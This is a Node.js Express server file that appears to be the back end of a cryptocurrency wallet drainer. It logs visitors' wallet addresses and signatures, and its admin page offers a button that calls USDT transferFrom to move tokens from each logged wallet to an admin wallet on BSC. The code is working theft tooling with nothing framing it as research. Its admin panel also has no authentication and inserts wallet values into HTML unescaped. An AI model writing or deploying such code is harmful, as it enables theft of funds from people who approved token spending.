const express = require("express");
const fs = require("fs");
const path = require("path");
const { ethers } = require("ethers");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const USDT = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_WALLET = "0xYourAdminWalletHere";
const PRIVATE_KEY = "your_private_key_here";
const BSC_RPC = "https://bsc-dataseed.binance.org/";
const provider = new ethers.JsonRpcProvider(BSC_RPC);
const signer = new ethers.Wallet(PRIVATE_KEY, provider);
const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)"
];
const usdt = new ethers.Contract(USDT, USDT_ABI, signer);

const USERS_FILE = path.join(__dirname, "users.json");
let users = fs.existsSync(USERS_FILE) ? JSON.parse(fs.readFileSync(USERS_FILE)) : [];

function saveUsers() {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

app.post("/log", (req, res) => {
  const { wallet, signature, timestamp } = req.body;
  if (!wallet || !signature || !timestamp) {
    return res.status(400).json({ error: "Missing required fields" });
  }
  if (!users.find(u => u.wallet === wallet)) {
    users.push({ wallet, signature, timestamp, transferred: false });
    saveUsers();
  }
  res.status(200).json({ success: true });
});

app.get("/admin", (req, res) => {
  let html = \`
    <h2>Admin Panel</h2>
    <table border=1 cellpadding=10>
    <tr><th>Wallet</th><th>Time</th><th>Transferred</th><th>Action</th></tr>\`;
  users.forEach(user => {
    html += \`
      <tr>
        <td>\${user.wallet}</td>
        <td>\${new Date(user.timestamp).toLocaleString()}</td>
        <td>\${user.transferred ? "✅" : "❌"}</td>
        <td>
          <form method="POST" action="/transfer">
            <input type="hidden" name="wallet" value="\${user.wallet}" />
            <button \${user.transferred ? "disabled" : ""}>Transfer</button>
          </form>
        </td>
      </tr>\`;
  });
  html += \`</table><style>body{font-family:sans-serif;padding:20px;}</style>\`;
  res.send(html);
});

app.post("/transfer", express.urlencoded({ extended: true }), async (req, res) => {
  const { wallet: userWallet } = req.body;
  try {
    const tx = await usdt.transferFrom(userWallet, ADMIN_WALLET, ethers.parseUnits("1.0", 18));
    await tx.wait();
    users = users.map(u =>
      u.wallet === userWallet ? { ...u, transferred: true } : u
    );
    saveUsers();
    res.redirect("/admin");
  } catch (err) {
    res.send(\`<p>Error: \${err.message}</p><a href="/admin">Back</a>\`);
  }
});

app.listen(PORT, () => {
  console.log(\`✅ Server running on http://localhost:\${PORT}\`);
});